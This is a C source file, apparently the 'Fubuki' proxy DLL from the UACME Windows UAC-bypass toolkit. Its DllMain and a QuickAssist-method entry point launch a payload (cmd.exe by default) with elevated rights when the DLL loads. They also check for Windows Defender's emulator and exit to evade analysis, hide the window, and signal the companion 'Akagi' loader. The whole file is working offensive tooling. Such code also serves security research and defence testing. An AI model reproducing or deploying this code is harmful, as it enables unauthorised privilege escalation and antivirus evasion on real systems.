/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2025
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     3.69
*
*  DATE:        07 Jul 2025
*
*  Proxy dll entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "fubuki.h"

UACME_PARAM_BLOCK g_SharedParams;
HANDLE g_SyncMutant = NULL;

/*
* DefaultPayload
*
* Purpose:
*
* Process parameter if exist or start cmd.exe and exit immediately.
*
*/
VOID DefaultPayload(
    VOID
)
{
    BOOL bSharedParamsReadOk;
    UINT ExitCode;
    PWSTR lpParameter;
    ULONG cbParameter;

    ucmDbgMsg(LoadedMsg);

    //
    // Read shared params block.
    //
    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
    if (bSharedParamsReadOk) {
        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters OK\r\n");

        lpParameter = g_SharedParams.szParameter;
        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
    }
    else {
        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters Failed\r\n");
        lpParameter = NULL;
        cbParameter = 0UL;
    }

    ucmDbgMsg(L"Fubuki, before ucmLaunchPayload\r\n");

    ExitCode = (ucmLaunchPayload(lpParameter, cbParameter) != FALSE);

    ucmDbgMsg(L"Fubuki, after ucmLaunchPayload\r\n");
    if (ExitCode == 0) {
        ucmDbgMsg(L"Fubuki, ucmLaunchPayload failed\r\n");
    }

    //
    // If this is default executable, show runtime info.
    //
    if ((lpParameter == NULL) || (cbParameter == 0)) {
        if (g_SharedParams.AkagiFlag == AKAGI_FLAG_TANGO)
            ucmQueryRuntimeInfo(FALSE);
    }

    //
    // Notify Akagi.
    //
    if (bSharedParamsReadOk) {
        ucmDbgMsg(L"Fubuki, completion\r\n");
        ucmSetCompletion(g_SharedParams.szSignalObject);
    }

    RtlExitUserProcess(ExitCode);
}

/*
* DllMain
*
* Purpose:
*
* Default proxy dll entry point.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);
   
    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('foff');
    }

    if (fdwReason == DLL_PROCESS_ATTACH) {
        DefaultPayload();
    }

    return TRUE;
}

/*
* EntryPointBackupLocked
*
* Purpose:
*
* Entry point to be used by QuickAssist method.
*
*/
BOOL WINAPI EntryPointBackupLocked(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    BOOL bSharedParamsReadOk;
    PWSTR lpParameter;
    ULONG cbParameter;

    UNREFERENCED_PARAMETER(lpvReserved);

    ucmDbgMsg(LoadedMsg);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
        RtlExitUserProcess('foff');

    if (fdwReason == DLL_PROCESS_ATTACH) {

        ucmHideMainWindow();
        LdrDisableThreadCalloutsForDll(hinstDLL);

        //
        // Read shared params block.
        //
        RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
        bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
        if (bSharedParamsReadOk) {
            lpParameter = g_SharedParams.szParameter;
            cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
        }
        else {
            lpParameter = NULL;
            cbParameter = 0UL;
        }

        ucmLaunchPayload3(lpParameter, cbParameter);

        //
        // Notify Akagi.
        //
        if (bSharedParamsReadOk) {
            ucmSetCompletion(g_SharedParams.szSignalObject);
        }
    }

    return TRUE;
}
